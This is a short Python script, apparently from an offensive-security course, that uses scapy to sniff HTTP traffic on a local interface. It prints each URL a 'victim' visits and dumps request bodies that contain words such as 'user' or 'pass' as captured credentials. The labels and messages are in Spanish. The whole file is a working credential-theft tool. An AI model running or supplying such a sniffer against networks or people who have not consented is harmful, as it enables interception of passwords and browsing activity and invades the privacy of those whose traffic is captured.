#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"[+] Saliendo", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    cred_keywords = ["login", "user", "pass", "mail"]
    if packet.haslayer(http.HTTPRequest):
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"\n[+] URL visitada por la vicitma: {url}", "green"))
        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()
                for cred in cred_keywords:
                    if cred in response:
                        print(colored(f"\n[+] Credenciales:{response}", "blue"))
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff("enp0s3")

if __name__ == '__main__':
    main()
